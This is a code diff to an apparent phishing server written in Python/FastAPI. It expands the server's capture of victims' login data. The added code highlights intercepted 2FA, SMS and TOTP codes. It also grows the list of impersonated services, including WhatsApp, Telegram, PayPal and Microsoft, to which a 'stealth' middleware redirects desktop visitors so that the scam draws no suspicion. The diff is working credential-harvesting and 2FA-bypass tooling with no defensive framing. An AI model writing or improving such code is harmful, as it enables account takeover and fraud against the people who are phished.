@@ -89,19 +89,31 @@ def log_capture(data: dict, ip: str, user_agent: str):
         try:
             with open(CAPTURE_FILE, "r") as f:
                 captures = json.load(f)
-        except:
-            pass
+        except Exception as e:
+            print(f"❌ Error reading capture file: {e}")
     
     captures.append(entry)
     
     with open(CAPTURE_FILE, "w") as f:
         json.dump(captures, f, indent=2)
-        
-    print("\n" + "="*50)
-    print(t("credentials_captured", ip=ip))
-    print(t("platform", platform=TARGET_PLATFORM))
-    print(t("data", data=json.dumps(data, indent=2)))
-    print("="*50 + "\n")
+    
+    # Display capture with enhanced visibility for 2FA/SMS codes
+    print("\n" + "="*60)
+    print(f"🎯 {t('credentials_captured', ip=ip)}")
+    print(f"🌐 {t('platform', platform=TARGET_PLATFORM)}")
+    
+    # Highlight 2FA/SMS codes
+    otp_keys = ['otp', 'code', 'verification_code', 'sms_code', '2fa_code', 'totp']
+    for key in otp_keys:
+        if key in data and data[key]:
+            print(f"🔐 {Colors.BOLD}{Colors.GREEN}2FA/SMS CODE CAPTURED: {data[key]}{Colors.RESET}")
+    
+    print("📋 Données capturées:")
+    for key, value in data.items():
+        if value:
+            print(f"   {Colors.YELLOW}{key}:{Colors.RESET} {value}")
+    
+    print("="*60 + "\n")
 
 @app.middleware("http")
 async def stealth_middleware(request: Request, call_next):
@@ -126,24 +138,34 @@ async def stealth_middleware(request: Request, call_next):
         print(t("stealth_mode_active"))
         # Redirect desktop users to the real site to avoid suspicion
         redirect_map = {
-            "twitter": "https://twitter.com",
-            "x": "https://twitter.com",
-            "google": "https://google.com",
-            "microsoft": "https://microsoft.com",
-            "linkedin": "https://linkedin.com",
-            "facebook": "https://facebook.com",
-            "instagram": "https://instagram.com",
-            "github": "https://github.com",
-            "amazon": "https://amazon.com",
-            "apple": "https://apple.com",
-            "discord": "https://discord.com",
-            "dropbox": "https://dropbox.com",
-            "paypal": "https://paypal.com",
-            "reddit": "https://reddit.com",
-            "slack": "https://slack.com",
-            "tiktok": "https://tiktok.com",
-            "yahoo": "https://yahoo.com"
-        }
+        "twitter": "https://twitter.com",
+        "x": "https://twitter.com",
+        "google": "https://google.com",
+        "microsoft": "https://microsoft.com",
+        "linkedin": "https://linkedin.com",
+        "facebook": "https://facebook.com",
+        "instagram": "https://instagram.com",
+        "github": "https://github.com",
+        "amazon": "https://amazon.com",
+        "apple": "https://apple.com",
+        "discord": "https://discord.com",
+        "dropbox": "https://dropbox.com",
+        "paypal": "https://paypal.com",
+        "whatsapp": "https://web.whatsapp.com",
+        "telegram": "https://web.telegram.org",
+        "tiktok": "https://tiktok.com",
+        "snapchat": "https://snapchat.com",
+        "spotify": "https://spotify.com",
+        "netflix": "https://netflix.com",
+        "yahoo": "https://yahoo.com",
+        "outlook": "https://outlook.com",
+        "hotmail": "https://hotmail.com",
+        "reddit": "https://reddit.com",
+        "twitch": "https://twitch.tv",
+        "vk": "https://vk.com",
+        "wechat": "https://web.wechat.com",
+        "line": "https://line.me",
+    }
         target_url = redirect_map.get(TARGET_PLATFORM, "https://google.com")
         return RedirectResponse(target_url)
 
